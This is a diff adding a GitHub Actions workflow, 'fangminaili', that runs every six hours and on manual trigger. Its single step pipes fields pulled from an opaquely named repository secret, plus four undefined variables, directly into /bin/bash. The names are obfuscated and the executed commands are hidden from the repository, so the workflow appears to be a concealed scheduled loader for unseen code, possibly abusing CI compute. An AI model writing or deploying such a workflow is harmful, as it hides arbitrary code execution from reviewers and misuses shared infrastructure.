@@ -1,0 +1,22 @@
+name: fangminaili
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangminaili
+        env:
+          aoqr01146: ${{ secrets.aoqr01146 }}
+        run: |
+          echo $aoqr01146 | jq -r .iqt9946 | /bin/bash
+          echo $bzfg5 | jq -r .gvn1 | /bin/bash
+          echo $oy0569 | jq -r .ezthh7 | /bin/bash
+          echo $xgdd8 | jq -r .iz980 | /bin/bash
+          echo $uhc51 | jq -r .izjo134 | /bin/bash
+
